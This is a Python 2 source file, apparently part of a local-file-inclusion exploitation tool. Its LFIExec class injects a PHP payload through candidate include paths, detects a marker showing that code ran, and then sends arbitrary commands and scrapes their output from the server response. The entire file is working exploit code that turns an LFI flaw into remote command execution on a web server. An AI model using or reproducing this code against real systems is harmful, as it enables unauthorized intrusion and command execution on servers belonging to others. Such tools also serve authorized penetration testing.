import re
import requests

# string functions
from core.functions import *

class LFIExec (object):
    files_exec = [ ]

    def __init__ (self, lfi):
        self.lfi = lfi
        self.lfi_path = None

    # get results of command execution
    def scrap_exec_results (self, content):
        # regexp
        regexp_start = re.compile ('.*' + self.lfi.tag_start_exec + '.*')
        regexp_end = re.compile ('.*' + self.lfi.tag_end_exec + '.*')
        # results
        results = list()
        # result start and end
        found_start = False
        found_end = False
        # getting lines
        lines = content.split ('\n')
        # search for start and end
        # keep what's between start and end needles
        for line in lines:
            if found_start and found_end:
                break
            if found_start == False and len (regexp_start.findall (line)) != 0:
                line = re.sub ('.*' + self.lfi.tag_start_exec, '', line)
                found_start = True
            if found_start == True and found_end == False and len (regexp_end.findall (line)) != 0:
                line = re.sub (self.lfi.tag_end_exec + '.*', '', line)
                found_end = True
            if found_start == True and len (line) != 0:
                results.append (line)
        return results

    # check if we got code exec
    def __check (self, content):
        lines = content.split ('\n')
        regexp = re.compile ('.*' + self.lfi.tag_exec_code + '.*')
        for line in lines:
            if len (regexp.findall (line)) != 0:
                return True
        return False

    # find LFI code execution path
    # TODO : user-agent
    def _check (self, prepare_request):
        # we are IE7
        headers = dict (self.lfi.headers)

        has_exec = None
        payload = '<?php echo "' + self.lfi.tag_exec_code + '"; ?>'
        for lfi in self.files_exec:
            print '[+] Testing : {0}'.format (lfi)
            # prepare request before trying exploitation
            purl = prepare_request (self.lfi, payload)
            # prepare url
            if lfi['type'] != 'data_uri':
                url = purl.replace (self.lfi.payload_placeholder, self.lfi.root_path + lfi['path'])
            else:
                url = purl
            print '    {0}'.format (url)
            # exec
            if lfi['type'] == 'post':
                req = requests.post (url, headers=self.lfi.headers, data=self.lfi.form)
            else:
                req = requests.get (url, headers=self.lfi.headers, cookies=self.lfi.cookies)
            # has code exec?
            if self.__check (req.text):
                has_exec = lfi
                self.lfi_path = lfi
                break

        return has_exec

    # do exec
    # TODO : randomize user-agent
    def _exploit (self, prepare_request, cmd):
        # we are IE7
        headers = dict(self.lfi.headers)
        # prepare request before exploitation
        purl = prepare_request (self.lfi, cmd)
        # prepare url
        url = purl.replace (self.lfi.payload_placeholder, self.lfi.root_path + self.lfi_path['path'])
        # exec
        req = requests.get (url, headers=self.lfi.headers, cookies=self.lfi.cookies)
        # extract result
        results = self.scrap_exec_results (req.text)
        return results

